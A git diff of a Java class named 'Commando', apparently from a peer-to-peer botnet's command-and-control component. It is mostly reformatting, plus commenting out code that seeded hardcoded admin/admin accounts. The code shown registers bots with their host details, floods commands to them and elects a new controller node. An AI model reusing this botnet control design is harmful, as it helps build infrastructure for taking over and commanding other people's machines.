@@ -85,32 +85,24 @@ public class Commando {
 	 */
 	public void initializeCeC() {
 
-		// non necessario
-		// nServ.updateDnsInformation();
-		Pairs<IP, String> botAlive = new Pairs<IP, String>(nServ.getMyIp(),nServ.getIdHash());
+		Pairs<IP, String> botAlive = new Pairs<IP, String>(nServ.getMyIp(), nServ.getIdHash());
 		nServ.getAliveBot().add(botAlive);
 		pServ.initP2P();
 		System.out.println("peer to peer fatto");
-		
-		
-		
-		Role admin=new Role("ADMIN");
-		rServ.save(admin);	
-		Set<Role> roleSet=new HashSet<Role>();
-		roleSet.add(admin);
-		uServ.save(new User("admin","admin", "a", "b", "ad", roleSet));
-		
-		Role god=new Role("GOD");
-		rServ.save(god);
-		roleSet.add(god);
-		uServ.save(new User("admin2","admin2", "a2", "b2", "ad2", roleSet));
-		
-		
+
+		//// TESTING
+		// Role admin=new Role("ADMIN");
+		// rServ.save(admin);
+		// Set<Role> roleSet=new HashSet<Role>();
+		// roleSet.add(admin);
+		// uServ.save(new User("admin","admin", "a", "b", "ad", roleSet));
+		////////
+
 		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
 				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(),
 				(nServ.isElegible() + ""));
 		bServ.save(bot);
-		
+
 	}
 
 	/**
@@ -125,7 +117,6 @@ public class Commando {
 		Integer iterationNumber = new Integer(auth.generateIterationNumber());
 		auth.getBotSeed().add(
 				new Pairs<String, Pairs<Long, Integer>>(idBot, new Pairs<Long, Integer>(keyNumber, iterationNumber)));
-		// auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
 		response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
 		return response;
 	}
@@ -194,7 +185,7 @@ public class Commando {
 	 * @param cmd
 	 * @param userSSoID
 	 */
-	
+
 	@Async
 	public void floodingByCecToBot(String cmd, String userSSoID) {
 		User user = uServ.findBySsoId(userSSoID);
@@ -203,8 +194,7 @@ public class Commando {
 		}
 		return;
 	}
-		
-	
+
 	@Async
 	public void flooding(String cmd) {
 		String msg = "";
@@ -264,8 +254,8 @@ public class Commando {
 			nServ.getCommandConquerIps().remove(0);
 			nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>(ip, pki.rebuildPuK(pk)));
 			pServ.setNewKing("");
-			nServ.setAliveBot(new SyncIpList<IP,String>());
-			// TODO DropDATABASE
+			nServ.setAliveBot(new SyncIpList<IP, String>());
+			// TODO DropDATABASE			
 			return true;
 		}
 		return false;
@@ -286,7 +276,7 @@ public class Commando {
 	/**
 	 * 
 	 */
-	@Async // forse inutile perche siamo sul thread nostro
+	@Async
 	public void startElection() {
 		List<Bot> botList = bServ.findAll();
 		List<String> ccList = new ArrayList<>();
@@ -298,41 +288,40 @@ public class Commando {
 			}
 		}
 
-
 		System.out.println(ccList.remove(nServ.getMyIp().toString()));
-		while(pServ.getNewKing().equals("")){
-		if (ccList.size() > 0) {
-			Long l = System.currentTimeMillis();
-			String s = l.toString() + botList.size();
-			byte[] b = s.getBytes();
-			Random rnd = new SecureRandom(b);
-			Double d = rnd.nextDouble();
-			Integer size = (ccList.size() - 1);
-			Double rand = d * size;
-			Long lv = Math.round(rand);
-			Integer li = lv.intValue();
-			System.out.println("long to int" + li);
-			String ip = ccList.get(li);
-			ccList.forEach((botIp) -> System.out.println("bot Ip per sorteggio" + botIp));
-			System.out.println("byte seed " + b.toString());
-			System.out.println(" next double " + d);
-			System.out.println("size " + size);
-			System.out.println("rand " + rand);
-			System.out.println("byte seed " + b.toString());
-			System.out.println("ho eletto " + ip);
-			if (ccReq.becameCc(ip)) {
-				pServ.setNewKing(bServ.searchBotIP(ip).getIdBot());
-			}else{
-				ccList.remove(ip);
+		while (pServ.getNewKing().equals("")) {
+			if (ccList.size() > 0) {
+				Long l = System.currentTimeMillis();
+				String s = l.toString() + botList.size();
+				byte[] b = s.getBytes();
+				Random rnd = new SecureRandom(b);
+				Double d = rnd.nextDouble();
+				Integer size = (ccList.size() - 1);
+				Double rand = d * size;
+				Long lv = Math.round(rand);
+				Integer li = lv.intValue();
+				System.out.println("long to int" + li);
+				String ip = ccList.get(li);
+				ccList.forEach((botIp) -> System.out.println("bot Ip per sorteggio" + botIp));
+				System.out.println("byte seed " + b.toString());
+				System.out.println(" next double " + d);
+				System.out.println("size " + size);
+				System.out.println("rand " + rand);
+				System.out.println("byte seed " + b.toString());
+				System.out.println("ho eletto " + ip);
+				if (ccReq.becameCc(ip)) {
+					pServ.setNewKing(bServ.searchBotIP(ip).getIdBot());
+				} else {
+					ccList.remove(ip);
+				}
+				System.out.println("erection completed strating transfer ");
+			} else {
+				System.out.println("nessuno da eleggere");
+				return;
 			}
-			System.out.println("erection completed strating transfer ");
-		} else{
-			System.out.println("nessuno da eleggere");
-			return;
+			// elegilo passa i dati
+			// passa il potere
 		}
-		// elegilo passa i dati
-		// passa il potere
-	}
 	}
 
 	public byte[] syncNeightboursBot(List<String> data) {
@@ -424,6 +413,5 @@ public class Commando {
 	public void setPki(CryptoPKI pki) {
 		this.pki = pki;
 	}
-	
 
 }
